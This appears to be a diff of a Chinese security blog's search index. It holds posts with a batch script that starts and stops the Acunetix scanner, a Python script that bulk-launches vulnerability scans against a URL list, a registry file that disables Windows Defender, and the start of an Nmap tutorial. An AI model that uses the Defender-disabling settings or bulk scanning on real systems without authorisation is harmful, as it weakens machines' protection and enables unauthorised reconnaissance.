-<p><img src="http://cdn.killlan.com/3f57eb9b0bf8bf39880bf710bb943014.png" alt="look httpserver"></p>
-<h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>此方法可以在所有浏览器使用,但是在操作步骤可能略有不同.</p>
-]]></content>
-      
-        <categories>
-            
-            <category> 技术问题解答 </category>
-            
-        </categories>
-        
-        
-        <tags>
-            
-            <tag> 浏览器 </tag>
-            
-            <tag> httpserver信息 </tag>
-            
-            <tag> 网站 </tag>
-            
-            <tag> chrome </tag>
-            
-        </tags>
-        
-    </entry>
-    
-    <entry>
-      <title><![CDATA[AWVS各类脚本]]></title>
-      <url>/2017/09/18/acunetix-web-vulnerability-scanner-11/</url>
-      <content type="html"><![CDATA[<h1 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h1><p>Acunetix Web Vulnerability Scanner是一个网站及服务器漏洞扫描软件，它包含有收费和免费两种版本。</p>
-<h1 id="启动-amp-停止脚本"><a href="#启动-amp-停止脚本" class="headerlink" title="启动&amp;停止脚本"></a>启动&amp;停止脚本</h1><p><img src="http://cdn.killlan.com/4ae163a2025e9e1901e2229469b6c34f.png" alt="strat awvs"><br><img src="http://cdn.killlan.com/8d90dc8fca64811b035345b251fd74e0.png" alt="service start awvs"><br><img src="http://cdn.killlan.com/6b6c1b1eeaa515b91f0d92892e148c4e.png" alt="service stop awvs"></p>
-<blockquote>
-<p>下面代码复制另存为awvs.bat</p>
-</blockquote>
-<figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="built_in">mode</span> <span class="built_in">con</span> lines=<span class="number">30</span> cols=<span class="number">60</span></span><br><span class="line"><span class="built_in">cls</span></span><br><span class="line"><span class="built_in">color</span> <span class="number">2</span>f</span><br><span class="line"><span class="built_in">echo</span>.-----------------------------------------------------------</span><br><span class="line"><span class="built_in">echo</span>.请选择使用：</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">echo</span>. <span class="number">1</span>.启动Awvs <span class="number">11</span>（即在下面输入<span class="number">1</span>）</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">echo</span>. <span class="number">2</span>.停止Awvs <span class="number">11</span>（即在下面输入<span class="number">2</span>）</span><br><span class="line"><span class="built_in">echo</span>.-----------------------------------------------------------</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">exist</span> "<span class="variable">%SystemRoot%</span>\System32\choice.exe" <span class="keyword">goto</span> Win7Choice</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> /p choice=请输入数字并按回车键确认:</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="keyword">if</span> <span class="variable">%choice%</span>==<span class="number">1</span> <span class="keyword">goto</span> StartAwvs</span><br><span class="line"><span class="keyword">if</span> <span class="variable">%choice%</span>==<span class="number">2</span> <span class="keyword">goto</span> StopAwvs</span><br><span class="line"><span class="built_in">cls</span></span><br><span class="line">"<span class="built_in">set</span> choice="</span><br><span class="line"><span class="built_in">echo</span> 您输入有误，请重新选择。</span><br><span class="line"><span class="keyword">goto</span> main</span><br><span class="line"></span><br><span class="line">:Win7Choice</span><br><span class="line">choice /c <span class="number">12</span> /n /m "请输入相应数字："</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">errorlevel</span> <span class="number">2</span> <span class="keyword">goto</span> StopAwvs</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">errorlevel</span> <span class="number">1</span> <span class="keyword">goto</span> StartAwvs</span><br><span class="line"><span class="built_in">cls</span></span><br><span class="line"><span class="keyword">goto</span> main</span><br><span class="line"></span><br><span class="line">:StartAwvs</span><br><span class="line"><span class="built_in">cls</span></span><br><span class="line"><span class="built_in">color</span> <span class="number">2</span>f</span><br><span class="line"><span class="built_in">net</span> <span class="built_in">start</span> Acunetix</span><br><span class="line"><span class="built_in">net</span> <span class="built_in">start</span> "Acunetix Database"</span><br><span class="line"><span class="built_in">echo</span>.-----------------------------------------------------------</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">echo</span> 成功启动 "Acunetix"，"Acunetix Database" 服务！</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="keyword">goto</span> end</span><br><span class="line"></span><br><span class="line">:StopAwvs</span><br><span class="line"><span class="built_in">cls</span></span><br><span class="line"><span class="built_in">color</span> <span class="number">2</span>f</span><br><span class="line"><span class="built_in">net</span> stop Acunetix</span><br><span class="line"><span class="built_in">net</span> stop "Acunetix Database"</span><br><span class="line"><span class="built_in">echo</span>.-----------------------------------------------------------</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">echo</span> 成功关闭 "Acunetix"，"Acunetix Database" 服务！</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="keyword">goto</span> end</span><br><span class="line"></span><br><span class="line">:end</span><br><span class="line"><span class="built_in">echo</span> 请按任意键退出。</span><br><span class="line">@<span class="built_in">Pause</span>&gt;<span class="built_in">nul</span></span><br></pre></td></tr></table></figure>
-
-<h1 id="批量添加扫描URL"><a href="#批量添加扫描URL" class="headerlink" title="批量添加扫描URL"></a>批量添加扫描URL</h1><blockquote>
-<p>该脚本为Python语言,使用前请安装Python.</p>
-<p>1、将下列代码复制另存为”awvs11批量扫描删除.py”</p>
-<p>2、全文搜索localhost:3443,全部替换为你awvs所在的服务器及端口</p>
-<p>3、username填你的账户名,pw填你的密码,是sha256加密后的密码</p>
-<p>4、把要添加的url列表保存成testawvs.txt文件，放在该脚本所在目录运行该脚本。</p>
-</blockquote>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> urllib2</span><br><span class="line"><span class="keyword">import</span> ssl</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">__author=<span class="string">"jamesj"</span></span><br><span class="line"><span class="comment">#localhost:3443全部替换为awvs所在的服务器及端口</span></span><br><span class="line">username=<span class="string">'mail@mail.com'</span></span><br><span class="line"><span class="comment">#账号邮箱</span></span><br><span class="line">pw=<span class="string">'sha256加密后的密码'</span></span><br><span class="line"><span class="comment">#sha256加密后的密码，通过burp抓包可获取,也可以使用(http://tool.oschina.net/encrypt?type=2)把密码进行加密之后填入，请区分大小写、中英文字符。</span></span><br><span class="line"><span class="comment">#以上内容为配置内容，然后把要添加的url列表保存成testawvs.txt文件，放在该脚本下运行该脚本。</span></span><br><span class="line">ssl._create_default_https_context = ssl._create_unverified_context</span><br><span class="line">url_login=<span class="string">"https://localhost:3443/api/v1/me/login"</span></span><br><span class="line">send_headers_login=&#123;</span><br><span class="line"><span class="string">'Host'</span>: <span class="string">'localhost:3443'</span>,</span><br><span class="line"><span class="string">'Accept'</span>: <span class="string">'application/json, text/plain, */*'</span>,</span><br><span class="line"><span class="string">'Accept-Language'</span>: <span class="string">'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3'</span>,</span><br><span class="line"><span class="string">'Accept-Encoding'</span>: <span class="string">'gzip, deflate, br'</span>,</span><br><span class="line"><span class="string">'Content-Type'</span>: <span class="string">'application/json;charset=utf-8'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">data_login=<span class="string">'&#123;"email":"'</span>+username+<span class="string">'","password":"'</span>+pw+<span class="string">'","remember_me":false&#125;'</span></span><br><span class="line"></span><br><span class="line">req_login = urllib2.Request(url_login,headers=send_headers_login)</span><br><span class="line">response_login = urllib2.urlopen(req_login,data_login)</span><br><span class="line">xauth = response_login.headers[<span class="string">'X-Auth'</span>]</span><br><span class="line">COOOOOOOOkie = response_login.headers[<span class="string">'Set-Cookie'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"当前验证信息如下\r\n cookie : %r  \r\n X-Auth : %r  "</span>%(COOOOOOOOkie,xauth)</span><br><span class="line">send_headers2=&#123;</span><br><span class="line">	<span class="string">'Host'</span>:<span class="string">'localhost:3443'</span>,</span><br><span class="line">	<span class="string">'Accept'</span>: <span class="string">'application/json, text/plain, */*'</span>,</span><br><span class="line">	<span class="string">'Accept-Language'</span>: <span class="string">'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3'</span>,</span><br><span class="line">	<span class="string">'Content-Type'</span>:<span class="string">'application/json;charset=utf-8'</span>,</span><br><span class="line">	<span class="string">'X-Auth'</span>:xauth,</span><br><span class="line">	<span class="string">'Cookie'</span>:COOOOOOOOkie</span><br><span class="line">	&#125;</span><br><span class="line"><span class="comment">#以上代码实现登录（获取cookie）和校验值</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_exec_scan</span><span class="params">()</span>:</span></span><br><span class="line">	url=<span class="string">"https://localhost:3443/api/v1/targets"</span></span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		urllist=open(<span class="string">'testawvs.txt'</span>,<span class="string">'r'</span>)<span class="comment">#这是要添加的url列表</span></span><br><span class="line">		formaturl=urllist.readlines()</span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> formaturl:</span><br><span class="line">			target_url=<span class="string">'http://'</span>+i.strip()</span><br><span class="line">			data=<span class="string">'&#123;"description":"222","address":"'</span>+target_url+<span class="string">'","criticality":"10"&#125;'</span></span><br><span class="line">			<span class="comment">#data = urllib.urlencode(data)由于使用json格式所以不用添加</span></span><br><span class="line">			req = urllib2.Request(url,headers=send_headers2)</span><br><span class="line">			response = urllib2.urlopen(req,data)</span><br><span class="line">			jo=json.loads(response.read())</span><br><span class="line">			target_id=jo[<span class="string">'target_id'</span>]<span class="comment">#获取添加后的任务ID</span></span><br><span class="line">			<span class="comment">#print target_id</span></span><br><span class="line">	<span class="comment">#以上代码实现批量添加</span></span><br><span class="line"></span><br><span class="line">			url_scan=<span class="string">"https://localhost:3443/api/v1/scans"</span></span><br><span class="line">			headers_scan=&#123;</span><br><span class="line">	<span class="string">'Host'</span>: <span class="string">'localhost:3443'</span>,</span><br><span class="line">	<span class="string">'Accept'</span>: <span class="string">'application/json, text/plain, */*'</span>,</span><br><span class="line">	<span class="string">'Accept-Language'</span>: <span class="string">'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3'</span>,</span><br><span class="line">	<span class="string">'Accept-Encoding'</span>: <span class="string">'gzip, deflate, br'</span>,</span><br><span class="line">	<span class="string">'Content-Type'</span>: <span class="string">'application/json;charset=utf-8'</span>,</span><br><span class="line">	<span class="string">'X-Auth'</span>:xauth,</span><br><span class="line">	<span class="string">'Cookie'</span>:COOOOOOOOkie,</span><br><span class="line">			&#125;</span><br><span class="line">			data_scan=<span class="string">'&#123;"target_id":'</span>+<span class="string">'\"'</span>+target_id+<span class="string">'\"'</span>+<span class="string">',"profile_id":"11111111-1111-1111-1111-111111111111","schedule":&#123;"disable":false,"start_date":null,"time_sensitive":false&#125;,"ui_session_id":"66666666666666666666666666666666"&#125;'</span></span><br><span class="line">			req_scan=urllib2.Request(url_scan,headers=headers_scan)</span><br><span class="line">			response_scan=urllib2.urlopen(req_scan,data_scan)</span><br><span class="line">			<span class="keyword">print</span> response_scan.read()+<span class="string">"添加成功！"</span></span><br><span class="line">	<span class="comment">#以上代码实现批量加入扫描</span></span><br><span class="line">		urllist.close()</span><br><span class="line">	<span class="keyword">except</span> Exception,e:</span><br><span class="line">		<span class="keyword">print</span> e</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">count</span><span class="params">()</span>:</span></span><br><span class="line">	url_count=<span class="string">"https://localhost:3443/api/v1/notifications/count"</span></span><br><span class="line">	req_count=urllib2.Request(url_count,headers=send_headers2)</span><br><span class="line">	response_count=urllib2.urlopen(req_count)</span><br><span class="line">	<span class="keyword">print</span> <span class="string">"当前存在%r个通知！"</span> % json.loads(response_count.read())[<span class="string">'count'</span>]</span><br><span class="line">	<span class="keyword">print</span> <span class="string">"-"</span> * <span class="number">50</span></span><br><span class="line">	<span class="keyword">print</span> <span class="string">"已存在以下任务"</span></span><br><span class="line">	url_info=<span class="string">"https://localhost:3443/api/v1/scans"</span></span><br><span class="line">	req_info=urllib2.Request(url_info,headers=send_headers2)</span><br><span class="line">	response_info=urllib2.urlopen(req_info)</span><br><span class="line">	all_info = json.loads(response_info.read())</span><br><span class="line">	num = <span class="number">0</span></span><br><span class="line">	<span class="keyword">for</span> website <span class="keyword">in</span> all_info.get(<span class="string">"scans"</span>):</span><br><span class="line">		num+=<span class="number">1</span></span><br><span class="line">		<span class="keyword">print</span> website.get(<span class="string">"target"</span>).get(<span class="string">"address"</span>)+<span class="string">" \r\n target_id:"</span>+website.get(<span class="string">"scan_id"</span>)</span><br><span class="line">	<span class="keyword">print</span> <span class="string">"共 %r个扫描任务"</span> % num</span><br><span class="line">		<span class="comment">#count()</span></span><br><span class="line"><span class="comment">#scan、target、notification！</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">del_scan</span><span class="params">()</span>:</span></span><br><span class="line">	url_info=<span class="string">"https://localhost:3443/api/v1/scans"</span></span><br><span class="line">	req_info=urllib2.Request(url_info,headers=send_headers2)</span><br><span class="line">	response_info=urllib2.urlopen(req_info)</span><br><span class="line">	all_info = json.loads(response_info.read())</span><br><span class="line">	counter = <span class="number">0</span></span><br><span class="line">	<span class="keyword">for</span> website <span class="keyword">in</span> all_info.get(<span class="string">"scans"</span>):</span><br><span class="line">		<span class="comment">#if (website.get("target").get("description"))== "222":</span></span><br><span class="line">		url_scan_del=<span class="string">"https://localhost:3443/api/v1/scans/"</span>+str(website.get(<span class="string">"scan_id"</span>))</span><br><span class="line">		req_del = urllib2.Request(url_scan_del,headers=send_headers2)</span><br><span class="line">		req_del.get_method =<span class="keyword">lambda</span>: <span class="string">'DELETE'</span></span><br><span class="line">		response_del = urllib2.urlopen(req_del)</span><br><span class="line">		counter = counter+<span class="number">1</span></span><br><span class="line">		<span class="keyword">print</span> <span class="string">"已经删除第%r个!"</span> %  counter</span><br><span class="line"><span class="comment">#del_scan()			#通过描述判断是否使用扫描器添加扫描器添加的时候设置description=“222”</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">del_targets</span><span class="params">()</span>:</span></span><br><span class="line">	url_info=<span class="string">"https://localhost:3443/api/v1/targets"</span></span><br><span class="line">	req_info=urllib2.Request(url_info,headers=send_headers2)</span><br><span class="line">	response_info=urllib2.urlopen(req_info)</span><br><span class="line">	all_info = json.loads(response_info.read())</span><br><span class="line">	<span class="keyword">for</span> website <span class="keyword">in</span> all_info.get(<span class="string">"targets"</span>):</span><br><span class="line">		<span class="keyword">if</span> (website.get(<span class="string">"description"</span>))== <span class="string">"222"</span>:</span><br><span class="line">			url_scan_del=<span class="string">"https://localhost:3443/api/v1/targets/"</span>+str(website.get(<span class="string">"target_id"</span>))</span><br><span class="line">			req_del = urllib2.Request(url_scan_del,headers=send_headers2)</span><br><span class="line">			req_del.get_method =<span class="keyword">lambda</span>: <span class="string">'DELETE'</span></span><br><span class="line">			response_del = urllib2.urlopen(req_del)</span><br><span class="line">			<span class="keyword">print</span> <span class="string">"ok!"</span></span><br><span class="line"><span class="comment">#del_targets()</span></span><br><span class="line"><span class="keyword">if</span> __name__== <span class="string">"__main__"</span>:</span><br><span class="line">	<span class="keyword">print</span> <span class="string">"*"</span> * <span class="number">20</span></span><br><span class="line">	count()</span><br><span class="line">	<span class="keyword">print</span> <span class="string">"1、使用testawvs.txt添加扫描任务并执行请输入1，然后回车\r\n2、删除所有使用该脚本添加的任务请输入2，然后回车\r\n3、删除所有任务请输入3，然后回车\r\n4、查看已存在任务请输入4，然后回车\r\n"</span></span><br><span class="line">	choice = raw_input(<span class="string">"&gt;"</span>)</span><br><span class="line"><span class="comment">#	print type(choice)</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> choice ==<span class="string">"1"</span>:</span><br><span class="line">		add_exec_scan()</span><br><span class="line">		count()</span><br><span class="line">	<span class="keyword">elif</span>  choice ==<span class="string">"2"</span>:</span><br><span class="line">		del_targets()</span><br><span class="line">		count()</span><br><span class="line">	<span class="keyword">elif</span>  choice ==<span class="string">"3"</span>:</span><br><span class="line">		del_scan()</span><br><span class="line">		count()</span><br><span class="line">	<span class="keyword">elif</span>  choice ==<span class="string">"4"</span>:</span><br><span class="line">		count()</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="keyword">print</span> <span class="string">"请重新运行并请输入1、2、3、4选择。"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#下图的注释信息是删除通知。。</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">	counter= 0</span></span><br><span class="line"><span class="string">	for website in all_info.get("notifications"):</span></span><br><span class="line"><span class="string">		if (website["data"].get("address")== "www.ly.com"):</span></span><br><span class="line"><span class="string">			counter = counter + 1</span></span><br><span class="line"><span class="string">			url_del = "https://localhost:3443/api/v1/scans/"+str(website["data"].get("scan_id"))</span></span><br><span class="line"><span class="string">			print url_del#print url_del</span></span><br><span class="line"><span class="string">			req_del = urllib2.Request(url_del,headers=send_headers2)</span></span><br><span class="line"><span class="string">			 #DELETE方法</span></span><br><span class="line"><span class="string">			try:</span></span><br><span class="line"><span class="string">				req_del.get_method = lambda:"DELETE"</span></span><br><span class="line"><span class="string">				response1 = urllib2.urlopen(req_del)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">			except:</span></span><br><span class="line"><span class="string">				print "error"</span></span><br><span class="line"><span class="string">				continue</span></span><br><span class="line"><span class="string">	print counter</span></span><br><span class="line"><span class="string">			#print response1.read()</span></span><br><span class="line"><span class="string">	#for address in need_info["address"]</span></span><br><span class="line"><span class="string">	#	if address</span></span><br><span class="line"><span class="string">del_all()</span></span><br><span class="line"><span class="string">"""</span></span><br></pre></td></tr></table></figure>
-
-<p><a href="http://cdn.killlan.com/awvs11jiaoben.zip" rel="external nofollow noopener noreferrer" target="_blank">点我下载awvs集合脚本</a></p>
-<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
-<li><a href="https://xianzhi.aliyun.com/forum/read/1616.html" rel="external nofollow noopener noreferrer" target="_blank">awvs 11一键启动-停止脚本</a></li>
-<li><a href="https://www.52pojie.cn/forum.php?mod=viewthread&tid=610851" rel="external nofollow noopener noreferrer" target="_blank">awvs11批量添加扫描\删除小脚本</a></li>
-</ul>
-]]></content>
-      
-        <categories>
-            
-            <category> 神兵利器 </category>
-            
-        </categories>
-        
-        
-        <tags>
-            
-            <tag> acunetix web vulnerability scanner 11 </tag>
-            
-            <tag> awvs11破解版版 </tag>
-            
-            <tag> awvs11启动停止脚本 </tag>
-            
-            <tag> awvs11批量扫描脚本 </tag>
-            
-            <tag> 漏洞扫描工具 </tag>
-            
-            <tag> 批处理脚本 </tag>
-            
-        </tags>
-        
-    </entry>
-    
-    <entry>
-      <title><![CDATA[windows10关闭最新Windows Defender]]></title>
-      <url>/2017/09/18/windows10-off-new-Windows-Defender/</url>
-      <content type="html"><![CDATA[<h1 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h1><p>Windows Defender，曾用名Microsoft AntiSpyware，是用来移除、隔离和预防间谍软件的程序，可以运行在Windows XP以及更高版本的操作系统上，并已经内置在Windows Vista以及以后的版本中。测试版于2005年1月6日发布，在2005年6月23日、2006年2月17日微软又发布了更新的测试版本。Windows Defender的定义库更新很频繁。在Windows 8中与Microsoft Security Essentials集成。<br>Windows Defender不像某些其他同类免费产品一样只能扫描系统，还可以对系统进行实时监控，移除已经安装的ActiveX插件，清除大多数微软的程序和其他常用程序的历史纪录。</p>
-<h1 id="组策略-amp-注册表关闭最新Windows-Defender"><a href="#组策略-amp-注册表关闭最新Windows-Defender" class="headerlink" title="组策略&amp;注册表关闭最新Windows Defender"></a>组策略&amp;注册表关闭最新Windows Defender</h1><h2 id="使用组策略关闭最新Windows-Defender"><a href="#使用组策略关闭最新Windows-Defender" class="headerlink" title="使用组策略关闭最新Windows Defender"></a>使用组策略关闭最新Windows Defender</h2><p>本地组策略编辑器仅在Windows 10 Pro，Enterprise和Education 版本中可用。</p>
-<p>所有版本可以使用下面的注册表。</p>
-<p>打开步骤:开始-运行[win+r]-输入gpedit.msc</p>
-<p>win+r=键盘windows图标+r键</p>
-<p><img src="http://cdn.killlan.com/8135e4a1df896c4344fafc9b4f07d32f.png" alt="gpedit"></p>
-<p>打开右侧菜单栏选择计算机配置-管理模板-Windows 组件-Windows Defender 防病毒程序-关闭 Windows Defender 防病毒程序</p>
-<p>默认是未配置,我先前启用了</p>
-<p><img src="http://cdn.killlan.com/2808ec3c8f3b6bbeb389c7a04af32bf0.png" alt="off windows defender"></p>
-<p><img src="http://cdn.killlan.com/681df75e8df08cf9a0a549b82c65d3c5.png" alt="start"></p>
-<p>选择已启用,点击确定,然后关闭组策略</p>
-<h2 id="使用注册表关闭最新Windows-Defender"><a href="#使用注册表关闭最新Windows-Defender" class="headerlink" title="使用注册表关闭最新Windows Defender"></a>使用注册表关闭最新Windows Defender</h2><p>使用REG文件打开或关闭Windows Defender Antivirus</p>
-<blockquote>
-<p>下面的.reg文件将添加和修改下面的注册表项中的DWORD值。</p>
-<p>HKEY_LOCAL_MACHINE \ SOFTWARE \ Policies \ Microsoft \ Windows Defender</p>
-<p>DisableAntiSpyware DWORD</p>
-<p>(delete) or 0 = On<br>1 = Off</p>
-</blockquote>
-<h3 id="关闭Windows-Defender-Antivirus"><a href="#关闭Windows-Defender-Antivirus" class="headerlink" title="关闭Windows Defender Antivirus"></a>关闭Windows Defender Antivirus</h3><p>下面代码复制,新建文本文档将内容粘贴进去,保存并重命名为关闭windef.reg</p>
-<figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Windows Registry Editor Version <span class="number">5</span>.<span class="number">00</span></span><br><span class="line"></span><br><span class="line">[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender]</span><br><span class="line">"DisableAntiSpyware"=dword:<span class="number">00000001</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="开启Windows-Defender-Antivirus"><a href="#开启Windows-Defender-Antivirus" class="headerlink" title="开启Windows Defender Antivirus"></a>开启Windows Defender Antivirus</h3><p>下面代码复制,新建文本文档将内容粘贴进去,保存并重命名为开启windef.reg</p>
-<figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Windows Registry Editor Version <span class="number">5</span>.<span class="number">00</span></span><br><span class="line"></span><br><span class="line">[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender]</span><br><span class="line">"DisableAntiSpyware"=-</span><br></pre></td></tr></table></figure>
-
-<p><a href="http://cdn.killlan.com/off_on_windefreg.zip" rel="external nofollow noopener noreferrer" target="_blank">点我下载:关闭和开启脚本</a></p>
-<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
-<li><a href="https://zh.wikipedia.org/zh-hans/Windows_Defender" rel="external nofollow noopener noreferrer" target="_blank">Windows Defender</a></li>
-<li><a href="https://www.tenforums.com/tutorials/5918-turn-off-windows-defender-windows-10-a.html" rel="external nofollow noopener noreferrer" target="_blank">Turn On or Off Windows Defender in Windows 10</a></li>
-</ul>
-]]></content>
-      
-        <categories>
-            
-            <category> 技术问题解答 </category>
-            
-        </categories>
-        
-        
-        <tags>
-            
-            <tag> win10 </tag>
-            
-            <tag> 删除最新Windows Defender </tag>
-            
-            <tag> 关闭最新Windows Defender </tag>
-            
-            <tag> 打开windows Defender </tag>
-            
-            <tag> 删除杀毒软件 </tag>
-            
-            <tag> 组策略 </tag>
-            
-            <tag> 注册表 </tag>
-            
-        </tags>
-        
-    </entry>
-    
-    <entry>
-      <title><![CDATA[Nmap 中文教程]]></title>
-      <url>/2017/09/16/Nmap-Chinese-Course/</url>
-      <content type="html"><![CDATA[<h1 id="0x00-简述"><a href="#0x00-简述" class="headerlink" title="0x00 简述"></a>0x00 简述</h1><p>Nmap（网络映射器）是一款用于网络发现和安全审计的网络安全工具，它是自由软件。软件名字Nmap是Network Mapper的简称。通常情况下，Nmap用于：</p>
-<ul>
-<li>列举网络主机清单</li>
-<li>管理服务升级调度</li>
-<li>监控主机</li>
-<li>服务运行状况</li>
-</ul>
